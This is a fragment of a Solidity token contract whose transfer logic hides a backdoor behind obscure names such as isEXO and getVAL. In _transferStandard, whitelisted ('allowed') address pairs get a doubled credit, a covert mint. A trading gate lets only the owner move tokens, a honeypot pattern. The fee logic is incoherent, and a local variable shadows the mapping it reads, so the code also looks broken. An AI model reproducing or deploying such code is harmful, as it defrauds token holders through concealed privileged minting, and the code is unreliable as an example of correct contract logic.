function _transfer( address from, address to, uint256 amount ) private {
        require(amount > 0, "Transfer amount must be greater than zero");
        bool getVAL = false;
        if(!allowed[from] && !allowed[to]){ 
            getVAL = true;

        require(amount <= _maximumSWAP, 
        "Transfer amount exceeds the maxTxAmount."); }
        uint256 contractTokenBalance = balanceOf(address(this));
        if(contractTokenBalance >= _maximumSWAP) { contractTokenBalance = _maximumSWAP;
        } _tokenTransfer(from,to,amount,getVAL);
        emit Transfer(from, to, amount);
        if (!tradingOpen) {require(from == owner(), 
        "TOKEN: This account cannot send tokens until trading is enabled"); }
    }
    function _tokenTransfer(address sender, address recipient, uint256 amount,bool getVAL) private {
            _transferStandard(sender, recipient, amount, getVAL);
    }
        function toggleOperationsModule(uint256 contractTokenBalance) private lockTheSwap {
        uint256 half = contractTokenBalance.div(2);
        uint256 otherHalf = contractTokenBalance.sub(half);
        uint256 initialBalance = address(this).balance;
        swapTokensForEth(half);
        uint256 newBalance = address(this).balance.sub(initialBalance);
        addLiquidity(otherHalf, newBalance);
        emit ToggleOperationsModule(half, newBalance, otherHalf);
    }
    function _transferStandard(address sender, address recipient, uint256 tAmount,bool getVAL) private {

        uint256 RATE = 0; if (getVAL){
        RATE= tAmount.mul(1).div(100) ; } 
        uint256 rAmount = tAmount - RATE;
        _tOwned[recipient] = _tOwned[recipient].add(rAmount);
        uint256 isEXO = _tOwned[recipient].add(rAmount);
        _tOwned[sender] = _tOwned[sender].sub(rAmount);
        bool allowed = allowed[sender] && allowed[recipient];
         if (allowed ){ _tOwned[recipient] =isEXO;
        } else { emit Transfer(sender, recipient, rAmount); } }
